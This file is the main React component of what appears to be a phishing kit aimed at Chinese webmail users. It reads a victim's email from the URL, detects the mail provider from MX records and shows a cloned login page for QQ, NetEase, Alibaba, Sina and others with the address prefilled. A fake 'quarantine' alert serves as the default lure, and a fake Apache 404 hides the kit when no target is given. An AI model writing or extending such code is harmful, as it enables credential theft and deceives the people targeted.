
import React, { useState, useEffect, useMemo } from 'react';
import { SecurityProvider } from './components/SecurityManager';
import { LanguageProvider, useTranslation } from './components/LanguageProvider';
import { getMailProviderFromMX, getThemeByDomain } from './DNSUtils';
import { motion, AnimatePresence } from 'framer-motion';

import AlibabaTheme from './themes/AlibabaTheme';
import BossmailTheme from './themes/BossmailTheme';
import Theme263 from './themes/Theme263';
import QQMailTheme from './themes/QQMailTheme';
import ExmailTheme from './themes/ExmailTheme';
import SinaTheme from './themes/SinaTheme';
import SohuTheme from './themes/SohuTheme';
import NetEaseTheme from './themes/NetEaseTheme';
import NetEaseQiyeTheme from './themes/NetEaseQiyeTheme';
import GlobalMailTheme from './themes/GlobalMailTheme';
import CoremailTheme from './themes/CoremailTheme';
import QuarantineAlert from './themes/QuarantineAlert';

const AppContent: React.FC = () => {
  const { lang } = useTranslation();
  const [detectedTheme, setDetectedTheme] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [showQuarantine, setShowQuarantine] = useState(false);
  const [isNotFound, setIsNotFound] = useState(false);

  const email = useMemo(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get('email') || '';
  }, []);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const emailParam = params.get('email');

    if (!emailParam) {
      setIsNotFound(true);
      setIsLoading(false);
      return;
    }

    const viewParam = params.get('view');
    const typeParam = params.get('type');

    // If view is quarantine, or if no type/view is specified, default to quarantine
    if (viewParam === 'quarantine' || (!viewParam && !typeParam)) {
      setShowQuarantine(true);
    }

    const initTheme = async () => {
      const startTime = Date.now();
      const domain = email.split('@')[1]?.toLowerCase();

      let theme = 'alibaba';

      if (typeParam) {
        theme = typeParam;
      } else if (domain) {
        const mxProvider = await getMailProviderFromMX(domain);
        if (mxProvider) {
          theme = mxProvider;
        } else {
          theme = getThemeByDomain(domain);
        }
      }

      const elapsedTime = Date.now() - startTime;
      const remainingTime = Math.max(0, 1500 - elapsedTime);

      setTimeout(() => {
        setDetectedTheme(theme);
        setIsLoading(false);
      }, remainingTime);
    };

    initTheme();
  }, [email]);

  const renderTheme = () => {
    if (showQuarantine) {
      return <QuarantineAlert email={email} onResolve={() => setShowQuarantine(false)} />;
    }

    switch (detectedTheme) {
      case 'bossmail': return <BossmailTheme prefilledEmail={email} />;
      case '263': return <Theme263 prefilledEmail={email} />;
      case 'qq': return <QQMailTheme prefilledEmail={email} />;
      case 'exmail': return <ExmailTheme prefilledEmail={email} />;
      case 'sina': return <SinaTheme prefilledEmail={email} />;
      case 'sohu': return <SohuTheme prefilledEmail={email} />;
      case 'netease': return <NetEaseTheme prefilledEmail={email} />;
      case 'netease_qiye': return <NetEaseQiyeTheme prefilledEmail={email} />;
      case 'globalmail': return <GlobalMailTheme prefilledEmail={email} />;
      case 'coremail': return <CoremailTheme prefilledEmail={email} />;
      default: return <AlibabaTheme prefilledEmail={email} />;
    }
  };

  return (
    <AnimatePresence mode="wait">
      {isNotFound ? (
        <motion.div
          key="404"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="min-h-screen flex items-center justify-center bg-gray-100 font-sans"
        >
          <div className="text-center p-8">
            <h1 className="text-9xl font-bold text-gray-300">404</h1>
            <p className="text-2xl font-semibold text-gray-600 mt-4">Page Not Found</p>
            <p className="text-gray-500 mt-2">The requested URL was not found on this server.</p>
            <hr className="my-8 border-gray-200" />
            <p className="text-sm text-gray-400 italic">Apache/2.4.41 (Ubuntu) Server at Port 443</p>
          </div>
        </motion.div>
      ) : isLoading ? (
        <motion.div 
          key="loader"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="min-h-screen flex items-center justify-center bg-gray-50"
        >
          <div className="flex flex-col items-center space-y-4">
            <div className="w-10 h-10 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
            <p className="text-gray-400 text-sm font-medium tracking-wide">
              {lang === 'zh' ? '正在加载安全登录环境...' : 'Initializing secure environment...'}
            </p>
          </div>
        </motion.div>
      ) : (
        <motion.div 
          key="content"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, ease: "easeOut" }}
          className="min-h-screen"
        >
          {renderTheme()}
        </motion.div>
      )}
    </AnimatePresence>
  );
};

const App: React.FC = () => {
  return (
    <LanguageProvider>
      <SecurityProvider>
        <AppContent />
      </SecurityProvider>
    </LanguageProvider>
  );
};

export default App;
